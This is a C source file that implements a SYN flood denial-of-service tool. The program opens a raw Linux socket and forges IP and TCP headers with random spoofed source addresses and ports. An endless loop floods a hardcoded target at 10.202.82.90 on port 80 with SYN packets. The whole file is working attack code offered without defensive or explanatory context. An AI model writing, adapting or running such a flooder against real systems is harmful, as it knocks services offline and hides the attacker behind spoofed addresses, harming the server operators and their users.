/*
 * Syn Flood DOS with LINUX sockets
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <fcntl.h>

//Used to checksum calculation
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

int createSocket(void);
void attack(const char* dest_ip, int dest_port);
unsigned short csum(unsigned short *ptr, int nbytes);

int main (int argc, char *argv[]) {
	const char* dest_ip = "10.202.82.90";
	int dest_port = 80;

	attack(dest_ip, dest_port);

	return 0;
}

int createSocket(void) {
	//Create a raw socket
	int fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

	if(fd < 0) {
		printf("Can't create raw socket");
		exit(-1);
	}
	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) < 0) {
		printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
		exit(-1);
	}

	//Set to non-block
	int flags = fcntl(fd, F_GETFL, 0);
	if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0){
		printf("Can't set to non-block mode");
		exit(-1);
	}

	return fd;
}

void attack(const char* dest_ip, int dest_port) {
	int fd = createSocket();

	//Datagram to represent the packet
	char* datagram = new char[4096];

	//IP header
	struct iphdr *iph = (struct iphdr *)datagram;

	//TCP header
	struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof (struct ip));

	//sockaddr_in is used to create socket on this computer
	//iphdr, tcphdr is data that actually send via the socket
	struct sockaddr_in sin;
	struct pseudo_header psh;

	//Static data bind
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = inet_addr(dest_ip);

	iph->version = 4;
	iph->ihl = 5;
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->daddr = sin.sin_addr.s_addr;

	tcph->dest = htons(dest_port);
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->window = htons(65535);
	tcph->urg_ptr = 0;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;

	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);

	while(true) {
		char source_ip[32];
		sprintf(source_ip, "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
		int source_port = rand()%65536;

		//Dynamic data bind
		sin.sin_port = htons(source_port);

		//Fill in the IP Header
		iph->id = htons(rand() % 65536);
		iph->saddr = inet_addr(source_ip);
		iph->check = 0;

		//checksum
		iph->check = csum((unsigned short*)datagram, iph->tot_len >> 1);
		
		//TCP Header
		tcph->source = sin.sin_port;
		tcph->seq = rand();
		tcph->check = 0;

		//Now the IP checksum
		psh.source_address = iph->saddr;
		memcpy(&psh.tcp , tcph , sizeof(struct tcphdr));

		tcph->check = csum((unsigned short*)&psh, sizeof(struct pseudo_header));

		sendto(fd, datagram, iph->tot_len, MSG_DONTWAIT, (struct sockaddr*)&sin, sizeof(struct sockaddr_in));
	}
}

unsigned short csum(unsigned short *ptr, int nbytes) {
	register long sum = 0;
	register short answer;

	while(nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}

	if(nbytes == 1) {
		unsigned short oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}
 
	sum = (sum>>16) + (sum & 0xffff);
	sum = sum + (sum>>16);
	answer = (short)~sum;
	 
	return(answer);
}